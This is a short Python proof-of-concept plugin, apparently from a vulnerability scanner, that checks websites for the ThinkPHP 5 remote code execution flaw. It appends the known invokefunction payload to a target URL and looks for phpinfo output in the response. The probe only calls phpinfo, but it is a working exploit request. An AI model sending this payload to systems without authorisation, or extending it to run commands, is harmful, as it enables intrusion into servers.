# -*- coding:utf-8 -*-
# Thinkphp5命令执行

from .. import requestUtil

def thinkphp_rce(url):
    try:
        resp = requestUtil.get(url)
        if "http://www.php.net/" in resp.text:
            return ["Thinkphp5命令执行", r"s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1"]
        else:
            return []
    except:
        return []

def fingerprint(service):
    if service.url:
        return True

def poc(service):
    url = service.url+r"?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1"
    return thinkphp_rce(url)